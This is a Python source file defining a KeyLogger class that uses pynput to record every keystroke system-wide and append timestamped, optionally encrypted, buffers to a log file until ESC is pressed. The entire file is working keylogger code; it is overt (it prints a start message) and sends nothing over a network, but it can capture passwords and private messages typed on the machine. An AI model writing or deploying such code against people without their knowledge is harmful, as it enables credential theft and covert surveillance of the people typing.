# logger/keylogger.py

from pynput import keyboard
from datetime import datetime
import os

from .encryptor import encrypt_log  # ✅ Fixed circular import
from config import LOG_FILE_PATH, ENCRYPT_LOGS

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.log_file = LOG_FILE_PATH
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)

    def _append_to_file(self, text: str):
        """
        Append plaintext or encrypted text to the log file.
        """
        if ENCRYPT_LOGS and encrypt_log:
            encrypted = encrypt_log(text)
            with open(self.log_file, 'ab') as file:
                file.write(encrypted + b'\n')
        else:
            with open(self.log_file, 'a', encoding='utf-8') as file:
                file.write(text)

    def _on_press(self, key):
        """
        Handle key press events.
        """
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.log += key.char
            elif key == keyboard.Key.space:
                self.log += ' '
            elif key == keyboard.Key.enter:
                self.log += '\n'
            elif key == keyboard.Key.tab:
                self.log += '\t'
            else:
                self.log += f'[{key.name}]'
        except Exception as e:
            self.log += f"[Error:{e}]"

    def _on_release(self, key):
        """
        Handle key release events.
        Stop logging if ESC is pressed.
        """
        if key == keyboard.Key.esc:
            self._save_log()
            return False

        if len(self.log) >= 50:  # Flush logs every 50 characters
            self._save_log()

    def _save_log(self):
        """
        Save and clear the current log buffer.
        """
        if self.log:
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
            self._append_to_file(timestamp + self.log + '\n')
            self.log = ""

    def start(self):
        """
        Start the keylogger.
        """
        print("[*] Keylogger started. Press ESC to stop.")
        with keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        ) as listener:
            listener.join()
